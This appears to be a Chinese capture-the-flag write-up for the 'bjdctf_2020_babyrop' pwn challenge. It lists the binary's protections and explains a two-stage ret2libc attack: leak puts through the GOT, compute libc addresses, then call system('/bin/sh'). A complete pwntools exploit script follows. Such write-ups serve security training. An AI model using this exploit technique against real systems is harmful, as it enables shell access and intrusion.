    bjdctf_2020_babyrop

    PWN题 ROP
    Created At : 2020-07-03 12:40
    Count:233 Views 👀 :
    Comment:
    1. 保护机制（64位）
    2. 利用思路：
    3. exp：

    这题算是比较经典的rop题目吧。Mark

    保护机制（64位）

    Arch: amd64-64-little
    RELRO: Partial RELRO
    Stack: No canary found
    NX: NX enabled
    PIE: No PIE (0x400000)

    利用思路：

    多亏了这个溢出，直接rop一波流。puts函数泄露puts地址，返回地址填main函数。通过puts地址计算system和binsh字符串的地址。再次构造rop链，通过rdi传参，system(“/bin/sh”)。

    exp：

    from pwn import *
# p=remote('node3.buuoj.cn',28703)
p=process('./bjdctf_2020_babyrop')
elf=ELF('./bjdctf_2020_babyrop')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

pop_rdi=0x400733
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
main_addr=0x4006AD

payload1='a'*(0x20+0x8)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main_addr)
p.recvuntil('tell me u story!')
p.sendline(payload1)
p.recv()
puts_addr=u64(p.recv(6).ljust(8,'\x00'))
print "puts addr is :"+hex(puts_addr)
libc_base= puts_addr - libc.symbols['puts']
system_addr=libc_base + libc.symbols['system']
binsh_addr= libc_base+ libc.search("/bin/sh\x00").next()

payload2='a'*(0x20+0x8)+p64(pop_rdi)+p64(binsh_addr)+p64(system_addr)
p.sendline(payload2)
p.interactive()
